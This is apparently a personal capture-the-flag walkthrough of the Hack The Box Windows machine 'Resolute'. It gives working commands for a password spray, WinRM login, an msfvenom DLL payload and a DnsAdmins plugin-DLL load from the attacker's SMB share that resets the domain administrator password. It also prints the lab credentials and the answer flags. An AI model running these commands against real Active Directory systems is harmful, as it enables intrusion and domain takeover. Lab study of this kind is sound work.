```json
Alias: Resolute
Date: 05-08_2024
Platform: Hackthebox
OS: Windows
Difficulty: Medium
Status: Complete
IP: 10.129.212.219
```

# Resolute
# Summary

Resolute is an easy difficulty Windows machine that features Active Directory. The Active Directory anonymous bind is used to obtain a password that the sysadmins set for new user accounts, although it seems that the password for that account has since changed. A password spray reveals that this password is still in use for another domain user account, which gives us access to the system over WinRM. A PowerShell transcript log is discovered, which has captured credentials passed on the command-line. This is used to move laterally to a user that is a member of the DnsAdmins group. This group has the ability to specify that the DNS Server service loads a plugin DLL. After restarting the DNS service, we achieve command execution on the domain controller in the context of `NT_AUTHORITY\SYSTEM`.

# Used Tools

* msfvenom
* dnsadmin
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2024-08-05 21:54 PKT
Nmap scan report for 10.129.212.219
Host is up (0.22s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-05 17:02:20Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h27m01s, deviation: 4h02m31s, median: 6m59s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2024-08-05T10:02:41-07:00
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-08-05T17:02:39
|_  start_date: 2024-08-05T16:55:24

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.57 seconds
```
## Discovered Subdomains
```
megabank.local
```

---
# Enumeration

We have ldap anonymous binding. Looking at the accounts and their description we find this

```
# Marko Novak, Employees, MegaBank Users, megabank.local
dn: CN=Marko Novak,OU=Employees,OU=MegaBank Users,DC=megabank,DC=local
description: Account created. Password set to Welcome123!
sAMAccountName: marko
```

The password for marko has been changed and is not 'Welcome123!'. So we do a password spray knowing that Welcome123! is the default password. Get the usernames from ldap and perform the spray
```bash
nxc smb $IP --dns-server $IP -u users.txt -p 'Welcome123!'
```

And we get the credentials for melanie

| Username | Password    |
| -------- | ----------- |
| melanie  | Welcome123! |

melanie has winrm access so connect with evil-winrm

```bash
evil-winrm -i $IP -u melanie -p Welcome123!
```

---

# Lateral Movement

C:\ Drive contains a hidden directory PSTranscript which has a powershell log with the password of ryan

| Username | Password            |
| -------- | ------------------- |
| ryan     | Serv3r4Admin4cc123! |

---

# Privilege Escalation

ryan is part of DnsAdmins. Which gives us control over the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key, The value in this registry contains a dll that is executed as NT Authority / System When the DNS is started.

First setup an SMBServer since if we download the dll to the target it will be deleted by Windows Defender.
```
sudo smbserver.py -smb2support share $(pwd)
```

Generate the dll
```
msfvenom -p windows/x64/exec cmd='net user administrator S3cret$ /domain' -
f dll > dnshack.dll
```

Then populate the registry value
```
cmd /c 'dnscmd.exe /config /serverlevelplugindll "\\10.10.14.103\share\dnshack.dll"'
```

Being in DnsAdmins doesn't give us rights to stop or restart the DNS but usually if we are in DnsAdmins it is common to have this privilege.
```
cmd /c "sc stop dns"
cmd /c "sc start dns"
```

Now the admin password should be changed.

login with psexec and get the flag.
```bash
psexec.py administrator:'S3cret$'@$IP
```

---

# Flags
- 44268db2f0737c397638e5dc90d8e745
- 44fc3f1c393fb13baee1b7f2a3655ff4

#CTF #CTF/Hackthebox #CTF/Hackthebox/Medium  #ActiveDirectory #ActiveDirectory/DNS #Windows/DnsAdmins
#Windows/CredentialHunting
